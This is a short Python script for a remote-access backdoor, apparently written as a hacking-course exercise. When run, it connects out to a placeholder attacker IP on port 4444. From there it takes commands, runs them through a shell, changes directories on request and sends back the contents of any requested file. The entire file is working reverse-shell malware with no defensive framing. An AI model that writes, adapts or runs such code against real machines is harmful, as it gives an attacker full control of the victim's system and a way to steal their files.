#!/usr/bin/env python

import socket
import subprocess
import json
import os


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError:
            return command[0] + " was not recognized as a command"


    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return file.read()


    def run(self):
        while True:

            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                try:
                    command_result = self.change_working_directory_to(command[1])
                except WindowsError:
                    command_result = command[1] + " is not a file that exists, dumbass! "
            elif command[0] == "download":
                command_result = self.read_file(command[1])
            else:
                command_result = self.execute_system_command(command)
            self.reliable_send(command_result)




my_backdoor = Backdoor("<IP ADDRESS>", 4444)
my_backdoor.run()




